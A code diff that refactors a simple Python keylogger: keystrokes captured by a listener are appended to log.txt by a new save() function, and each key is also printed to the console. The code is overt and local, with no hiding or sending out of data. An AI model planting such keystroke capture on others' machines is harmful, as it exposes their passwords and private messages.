@@ -15,15 +15,9 @@ def on_press(key):
     except KeyError:
         key = "?Error?"
 
-    print(f"{key} pressed")
+    save(key)
 
-    with open("log.txt", "a") as f:
-        if key.find("space") > 0:
-            f.write(' ')
-        elif key.find("enter") > 0:
-            f.write('\n')
-        elif key.find("Key") == -1:
-            f.write(key)
+    print(f"'{key}' pressed")
 
 
 def on_release(key):
@@ -31,13 +25,15 @@ def on_release(key):
         return False
 
 
-def write_file(keys):
-    with open("log.txt", "a") as f:
-        for key in keys:
-            if key.find("space") > 0:
-                f.write('  ')
-            elif key.find("Key") == -1:
-                f.write(key)
+# save every pressed key in a log file
+def save(key):
+    with open("log.txt", "a") as log:
+        if key.find("space") > 0:
+            log.write(' ')
+        elif key.find("enter") > 0:
+            log.write('\n')
+        elif key.find("Key") == -1:
+            log.write(key)
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
